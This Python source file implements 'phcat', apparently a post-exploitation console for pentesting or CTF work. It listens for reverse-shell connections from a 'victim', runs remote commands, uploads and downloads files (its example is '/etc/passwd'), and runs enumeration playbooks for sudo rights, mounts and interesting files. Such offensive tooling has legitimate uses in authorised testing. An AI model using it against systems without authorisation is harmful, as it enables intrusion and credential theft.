import re
import pwn
from pwnlib.term.completer import LongestPrefixCompleter
import listener
from pheelshell import Pheelshell
from playbooks.enumerate.basic_host_information import EnumerateBasicHostInformation
from playbooks.enumerate.dependencies import EnumerateDependencies
from playbooks.enumerate.interesting_files import EnumerateInterestingFiles
from playbooks.enumerate.sudo_list import EnumerateSudoList
from playbooks.enumerate.mounts import EnumerateMounts

module_type_playbook_classes_map = {
    'enumerate': [
        EnumerateBasicHostInformation,
        EnumerateDependencies,
        EnumerateSudoList,
        EnumerateInterestingFiles,
        EnumerateMounts
    ]
}

PHCAT_PROMPT_STR = 'phcat'

autocompleter = LongestPrefixCompleter([
    'help',
    'exit',
    'show',
    'use',
    'enumerate',
    'hints',
    'run',
    'start',
    'interactive',
    'download',
    'upload',
    'listen'
])

help = '''
exit
help
listen <victim_ip>:<port>
run '<command>'
download '<remote_path>' '<local_path>'
upload '<local_path>' '<remote_path>'
show hints
show enumerate
show enumerate [playbook_index]
use enumerate [playbook_index]
start interactive # TODO
'''

def prompt(pheelshell: Pheelshell=None):
    prompt_str = f'[({PHCAT_PROMPT_STR})]> '
    if pheelshell:
        basic_host_information = pheelshell.get_playbook(EnumerateBasicHostInformation)
        victim_user = basic_host_information.get_user()
        victim_hostname = basic_host_information.get_hostname()
        prompt_str = f'[{victim_user}@{victim_hostname} ({PHCAT_PROMPT_STR})]> '

    while True:
        command = None
        with autocompleter:
            command = pwn.str_input(prompt=prompt_str).strip()

        # Handle quit command
        if command == 'quit' or command == 'exit':
            exit()

        # Handle help command
        if command == 'help':
            print(help.strip())
            continue

        # Handle listen command
        matches = re.search(r'listen (?P<address>.*):(?P<port>.*)', command)
        if matches:
            if not pheelshell:
                address = matches.group('address')
                port = matches.group('port')
                listener.listen(address, port)
                exit()
            else:
                print('Already connected to a victim. Start a new prompt to listen on a different IP.')
                continue
        
        # Handle start interactive command
        if command == 'start interactive':
            if not pheelshell:
                print('Must be connected to a victim in order gain an interactive shell.')
                continue

            # TODO: Not working
            pheelshell.start_interactive()
        
        # Handle show hints command
        if command == 'show hints':
            if not pheelshell:
                print('Must be connected to a victim in order to show hints.')
                continue

            hints = pheelshell.get_hints()
            for index, hint in enumerate(hints):
                print(f'[hint #{index + 1}]')
                print(f'↳ {hint}')

            continue

        # Handle download command
        matches = re.search(r'download \'(?P<remote_path>.*)\' \'(?P<local_path>.*)\'', command)
        if matches:
            remote_path = matches.group('remote_path')
            local_path = matches.group('local_path')
            response_status = pheelshell.download(remote_path, local_path)
            print(response_status)
            continue
        elif command.startswith('download'):
            print('The paths must be enclosed in single quotes: \"download \'/etc/passwd\' \'passwd.txt\'\"')
            continue

        # Handle upload command
        matches = re.search(r'upload \'(?P<local_path>.*)\' \'(?P<remote_path>.*)\'', command)
        if matches:
            local_path = matches.group('local_path')
            remote_path = matches.group('remote_path')
            response_status = pheelshell.upload(local_path, remote_path)
            print(response_status)
            continue
        elif command.startswith('upload'):
            print('The paths must be enclosed in single quotes: \"upload \'/etc/passwd\' \'passwd.txt\'\"')
            continue

        # Handle generic command with 'action type #index'
        matches = re.search(r'(?P<action>.*) (?P<type>.*) (?P<index>[0-9]+)', command)
        if not matches:
            # Handle run command
            matches = re.search(r'run \'(?P<command>.*)\'', command)
            if matches:
                victim_command = matches.group('command')
                output = pheelshell.execute_command(victim_command)
                print(output)
                continue
            elif command.startswith('run'):
                print('The command must be enclosed in single quotes: \"run \'ls\'\"')
                continue

            if not matches:
                # Handle generic command with 'action type'
                matches = re.search(r'(?P<action>.*) (?P<type>.*)', command)

        if not matches:
            print(f'Unrecognized command: "{command}"')
            continue

        action = matches.group('action')
        if action not in ['use', 'show']:
            print(f'Unrecognized action in command: "{command}"')
            continue

        module_type = matches.group('type')
        if action != 'run' and module_type not in module_type_playbook_classes_map:
            print(f'Unrecognized module type in command: "{command}"')
            continue

        module_index = int(matches.group('index')) - 1 if len(matches.groups()) == 3 else None
        if module_index and (module_index < 0 or module_index >= len(module_type_playbook_classes_map[module_type])):
            print(f'Module index for {module_type} is out of range: {module_index + 1}')
            continue

        if action and module_type:
            if action == 'show':
                if module_index is not None:
                    if not pheelshell:
                        print('Must be connected to a victim in order to show playbook results.')
                        continue
                    else:
                        playbook_class = module_type_playbook_classes_map[module_type][module_index]
                        playbook = pheelshell.get_playbook(playbook_class)
                        if playbook and playbook.has_run():
                            module_output = str(playbook)
                            print(module_output)
                        else:
                            print(f'Must run playbook before showing results by running \'use {module_type} {module_index + 1}\'.')
                else:
                    for index, playbook_class in enumerate(module_type_playbook_classes_map[module_type]):
                        playbook = pheelshell.get_playbook(playbook_class) if pheelshell else None
                        status = 'X' if playbook and playbook.has_run() else ' '
                        description = playbook_class.description()
                        print(f'{index + 1}. [{status}] {playbook_class.__name__}: {description}')
            elif action == 'use' and module_index is not None:
                if not pheelshell:
                    print('Must be connected to a victim in order to use playbooks.')
                    continue

                playbook_class = module_type_playbook_classes_map[module_type][module_index]
                playbook = playbook_class()
                pheelshell.run_playbook(playbook)
                module_output = str(playbook) # TODO: .get_output() instead of str()
                print(module_output)

def main():
    prompt()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\b\b\r')
